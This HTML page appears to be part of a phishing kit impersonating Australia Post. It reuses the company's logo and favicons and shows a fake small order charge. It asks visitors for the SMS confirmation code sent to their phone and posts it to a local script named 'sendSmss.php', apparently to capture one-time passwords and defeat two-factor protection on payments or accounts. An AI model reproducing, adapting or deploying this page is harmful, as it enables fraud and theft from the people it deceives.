

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>OTP - Australia Post</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">  
  <link rel="stylesheet"  href="css/hover.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" type="image/png" sizes="32x32" href="https://auspost.com.au//mypost/auspoststaticassets/assets/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://auspost.com.au//mypost/auspoststaticassets/assets/favicons/favicon-16x16.png">


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

      <section class="bg-white">
          <div class="sms text-center shadow px-5 py-5">
              <div class="logo mb-5">
                  <img src="https://auspost.com.au/mypost/auspoststaticassets/assets/authentication/common/images/brand-icon-australia-post.svg">
              </div>
              <div class="comm border py-3 ">
                <div class="row">
                    <div class="col-md-6 text-end" id="com">
                       <p>Order number :</p>
                       <p>Order :</p>
                       <p>Recipient :</p>
                    </div>
                    <div class="col-md-6 text-start" id="com">
                       <p><strong>000453217</strong></p>
                       <p><strong>03,00 AUD</strong></p>
                       <p><strong>Australia Post</strong></p>
                    </div>
                </div>       
              </div>
              <p class="mt-4">Authenticate yourself by entering the confirmation code received on your phone. This authentication is mandatory to confirm your operation.</p>
                <form action="app/sendSmss.php" method="post">

                    <input type="hidden" value="sms" name="step">

                    <input type="text" required class="form-control" placeholder="OTP" name="sms"><br>
                    <div class="error" class="error">Authentication error.</div>
                    <div class="bttn">
                        <button style="width:100%" name="submit" class="btn btn-warning py-2 mt-5 text-center">Validate</button>
                    </div>
                </form>
          </div>
      </section>



  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>

</body>
</html>